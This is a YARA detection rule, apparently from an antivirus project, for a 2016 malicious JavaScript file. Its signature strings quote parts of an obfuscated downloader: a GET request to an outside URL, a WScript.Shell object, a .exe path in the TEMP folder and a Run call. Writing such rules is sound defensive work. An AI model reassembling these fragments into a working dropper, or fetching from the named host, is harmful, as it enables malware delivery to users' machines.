rule sig_20160330_e2cad3cfd3ee8bb54000c54fc148b1b1 {
  meta:
    description = "datamaliciousorder - file 20160330_e2cad3cfd3ee8bb54000c54fc148b1b1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fe2f2bf96b8eabdbc1f02aa54c332092499d239799fcb3650fbbc8273e730ac7"

  strings:
    $s1  = "_I0[_I](\"GET\", \"http://assura-courtage.org/j2osla\", false);" fullword ascii
    $s2  = "var _E2 = function _U() {return WScript[_NE](\"WScript\"+\".Shell\");}(), _R = 11;" fullword ascii
    $s3  = "function _GS(_I1, _PF){_BQ = _BQ * 1; return _I1 - _PF;};" fullword ascii
    $s4  = "if (_I0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _C(){return _T + \"\";};" fullword ascii
    $s6  = "function _Q() {return _E2[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"kVJ5B4ZWpP0ZyW.ex\" + \"e\";};" fullword ascii
    $s7  = "function _E() {return ((_M == true) && (_M == _H)) ? 1 : _BQ;};" fullword ascii
    $s8  = "function _K(_X){_E2[\"Run\"](_X, _BQ, _BQ);};" fullword ascii
    $s9  = " while (_D){" fullword ascii
    $s10 = "function _W(){return 22;};" fullword ascii
    $s11 = "function _L(_NS) {var _PZ = (1, 2, 3, 4, 5, _NS); return _PZ;};" fullword ascii
    $s12 = "return _GS(_ZM, _V0);" fullword ascii
    $s13 = "function _E0()" fullword ascii
    $s14 = "function _Q0(){return _NE;};" fullword ascii
    $s15 = "var _YY = new this[\"Date\"]();" fullword ascii
    $s16 = "var _H = false;" fullword ascii
    $s17 = "_M = true; " fullword ascii
    $s18 = "var _M = false;" fullword ascii
    $s19 = "_H = true; " fullword ascii
    $s20 = "var _IR = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}